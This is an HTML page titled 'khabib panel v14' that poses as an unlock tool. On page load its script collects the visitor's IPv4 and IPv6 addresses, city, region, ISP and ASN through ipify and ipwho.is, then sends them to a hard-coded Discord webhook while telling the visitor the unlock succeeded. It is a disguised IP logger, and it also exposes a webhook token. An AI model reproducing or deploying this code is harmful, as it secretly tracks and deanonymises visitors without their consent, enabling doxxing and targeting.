<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>khabib panel v14</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0f172a;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .box {
            background: #020617;
            padding: 25px;
            border-radius: 10px;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,0,0,0.6);
        }
    </style>
</head>
<body>

<div class="box" id="resultBox">
    <h2>khabib</h2>
    <p>Traitement en cours pour d√©bloquer khabib panel v14...</p>
    <p id="resultText">Chargement...</p>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1453050534851379243/QQWpYZbMCPh4wn637YIkWNvpPLw7BxVyo6kJWN2q1xxn4IXiEnL6LGU-wDVhGbMiUaEU";

window.onload = function() {
    document.getElementById("resultText").textContent = "R√©cup√©ration de vos donn√©es...";

    let ipv4 = "Inconnu";
    let ipv6 = "Non disponible";
    let geoInfo = "Geo indisponible";

    // R√©cup IPv4
    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            ipv4 = data.ip;

            // Tentative IPv6
            return fetch("https://api64.ipify.org?format=json")
                .then(res => {
                    if (!res.ok) throw new Error("Pas d'IPv6");
                    return res.json();
                })
                .then(data6 => { ipv6 = data6.ip; })
                .catch(() => { ipv6 = "Non disponible"; });
        })
        .then(() => {
            // Geo via ipwho.is (meilleure tol√©rance aux volumes)
            return fetch(`https://ipwho.is/${ipv4}`)
                .then(geoRes => geoRes.json())
                .then(geoData => {
                    if (geoData.success === false) {
                        geoInfo = "Geo √©chou√©e : " + (geoData.message || "Inconnu");
                        return;
                    }

                    const flag = geoData.country_code ? String.fromCodePoint(...[...geoData.country_code.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";

                    geoInfo = `üåç Pays : ${flag} ${geoData.country || "Inconnu"} (${geoData.country_code || "?"})\n` +
                              `üèôÔ∏è Ville : ${geoData.city || "Inconnu"} (${geoData.region || "Inconnu"})\n` +
                              `üì° ISP : ${geoData.isp || "Inconnu"}\n` +
                              `üè¢ Org / ASN : ${geoData.org || "Inconnu"} (AS${geoData.asn || "?"})`;
                })
                .catch(() => { geoInfo = "Geo indisponible (erreur r√©seau)"; });
        })
        .finally(() => {
            // Envoi webhook en toutes circonstances
            const payload = {
                content: `üì• **Nouveau visiteur (auto)**\n` +
                         `üåê IPv4 : ${ipv4}\n` +
                         `üåê IPv6 : ${ipv6}\n` +
                         `${geoInfo}\n` +
                         `üïí ${new Date().toLocaleString()}`
            };

            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            document.getElementById("resultText").textContent = "D√©bloqu√© avec succ√®s !";
        })
        .catch(() => {
            document.getElementById("resultText").textContent = "Erreur r√©seau, mais donn√©es envoy√©es.";
        });
}
</script>

</body>
</html>
